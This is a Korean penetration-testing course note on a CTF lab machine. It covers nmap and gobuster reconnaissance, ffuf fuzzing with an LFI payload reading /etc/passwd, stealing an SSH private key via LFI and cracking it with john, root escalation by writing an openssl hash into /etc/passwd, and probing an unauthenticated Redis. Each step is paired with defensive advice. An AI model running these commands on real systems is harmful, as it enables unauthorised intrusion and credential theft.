# 2026-09-17 · 모의해킹 방법론 · 정찰(nmap/gobuster) · LFI · 권한상승 · CTF(redis)

> 원본: [original/Notes_260917_150637_1.pdf](original/Notes_260917_150637_1.pdf)
>
> ⚠️ 교육용 취약 실습 머신(CTF) 대상 기록. 정찰→취약점→권한상승 흐름을 방어 관점과 함께 정리한다. 실제 시스템 대상 사용 금지.

## 1. 모의해킹 절차
**정보수집(정찰) + 취약점 점검 → 모의해킹(공격) → 결과보고서 작성**

| 유형 | 사전 정보 |
|---|---|
| **Black box** | 대상 정보 없이 외부 관점 |
| **White box** | 소스·구성 등 전체 정보 제공 |
| **Gray box** | 일부 정보만 제공 |

## 2. 정찰 — nmap
```bash
sudo nmap -sn 192.168.16.0/24       # 해당 대역 호스트 스캐닝(살아있는 호스트)
sudo nmap -sT 192.168.16.44         # TCP 포트 open/close 스캔(연결 완료)
   # 그 외: -sS(SYN) -sF(FIN) -sA(ACK) -sN(Null) -sX(Xmas) ...
```
- 예: 22(SSH)·80(HTTP) 포트 open 확인 → HTTP면 페이지 소스·디렉터리 확인으로 이어감.

## 3. 웹 정찰 — gobuster / robots.txt / 퍼징
```bash
# 숨은 디렉터리 스캔
sudo gobuster dir -u http://192.168.16.44 \
     -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
   # wordlist에 있는 경로로 dir 스캔
```
- `http://<target>/robots.txt` → 검색엔진 크롤러에게 수집/차단 경로를 안내하는 텍스트 파일(종종 민감 경로가 노출됨).
- **Fuzzing**: 무작위/다량 입력을 넣어 취약점·버그를 찾는 방법.
```bash
# ffuf로 파라미터/경로 퍼징 (FUZZ 위치에 wordlist 대입)
sudo ffuf -w /usr/share/wordlists/.../directory-list-2.3-medium.txt \
     -t 100 -u "http://192.168.16.44/secret/evil.php?FUZZ=/etc/passwd" -fs 0
   # -t: 스레드, -fs 0: 크기 0인 응답 필터(걸러내기)
```

## 4. File Inclusion (LFI) → SSH 키 탈취
취약한 파라미터로 서버 로컬 파일을 읽어 **SSH 개인키(id_rsa)** 를 탈취하는 흐름.
```bash
# 예: http://<target>/secret/evil.php?command=/home/mounce/.ssh/id_rsa  로 키 노출
sudo vi id_rsa                       # 노출된 키 저장
sudo ssh2john id_rsa > key.hash      # 크래킹 입력 형식으로 변환
sudo john key.hash                   # 패스프레이즈 크래킹(john)
sudo ssh -i id_rsa mounce@192.168.16.44   # 복구한 키로 SSH 접속
```
- 방어: 입력값 화이트리스트, 경로 정규화, 웹 루트 밖 파일 접근 차단, 개인키 권한(600)·노출 금지.

## 5. 권한 상승 (Privilege Escalation)
```bash
# SUID/쓰기 가능 파일 탐색
find / -writable -type f 2>/dev/null     # 전체 사용자가 write 가능한 파일 탐색
```
- **방법 1**: 사용자의 UID/GID 값 변경(취약 설정 악용)
- **방법 2**: `/etc/shadow` 쓰기 가능 시 원하는 PW 해시 저장
- **방법 2 상세**(openssl로 해시 생성 → passwd 교체):
```bash
openssl passwd 1234                  # 비밀번호 해시 생성
sudo vi /etc/passwd
   # root:x:0:0: → root:(openssl 해시):0:0: 로 수정(비밀번호 필드에 삽입)
su root                              # 해당 비밀번호로 root 전환
```
- 방어: `/etc/passwd`·`/etc/shadow` 권한 점검, SUID 바이너리 최소화, 세계-쓰기 파일 제거.

## 6. CTF.2 — Redis 노출
```bash
sudo nmap -A -v -p- 192.168.16.94    # 모든 포트 스캔(-p-), 버전·스크립트
sudo gobuster dir -u 192.168.16.94 ...
ps -ely  /  ps ax                    # 현재 실행 프로세스 확인
ss -tulnp                            # 포트 상태(LISTEN) 확인
redis-cli                            # Redis 접속
  get <key>                          # 키 값 조회
```
- **Redis-server**: 인메모리 데이터 저장소(PC ↔ redis-server). 인증 없이 외부 노출되면 데이터·키 유출 위험.
- 방어: Redis `bind`·`requirepass` 설정, 외부 노출 차단(방화벽), `protected-mode on`.

## 7. 공격 체인 요약 (방어 매핑)
| 단계 | 기법 | 방어 |
|---|---|---|
| 정찰 | nmap, gobuster, robots.txt | 불필요 포트/경로 제거, 버전 숨김 |
| 침투 | LFI, 퍼징 | 입력 검증, 경로 제한 |
| 자격 탈취 | id_rsa 노출 + john | 키 권한·비노출, 강한 패스프레이즈 |
| 권한 상승 | passwd/shadow 쓰기, SUID | 파일 권한 점검, 최소 권한 |
| 서비스 | Redis 무인증 노출 | 인증·바인딩·방화벽 |

## 8. 복습 질문
1. Black/White/Gray box 테스트의 차이는?
2. nmap `-sS`와 `-sT`의 차이는?
3. LFI로 id_rsa가 털렸다면 어떤 설정이 잘못된 것인가?
4. 인증 없는 Redis가 위험한 이유와 대응 설정은?
